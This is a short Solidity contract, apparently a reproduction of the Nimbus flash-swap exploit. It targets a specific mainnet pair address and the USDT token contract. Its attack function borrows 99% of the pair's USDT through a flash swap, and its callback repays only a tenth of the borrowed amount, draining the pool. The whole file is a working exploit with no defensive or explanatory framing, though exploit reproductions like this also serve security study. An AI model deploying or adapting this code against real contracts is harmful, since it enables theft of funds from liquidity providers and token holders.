// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IERC20Custom {
    function transfer(address, uint256) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract NimbusAttack {
    address public pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;
    address public usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    function attack() external {
        uint256 amount = (IERC20(usdt).balanceOf(pair) * 99) / 100;
        IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
    }

    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        IERC20Custom(usdt).transfer(pair, amount0 / 10);
    }
}
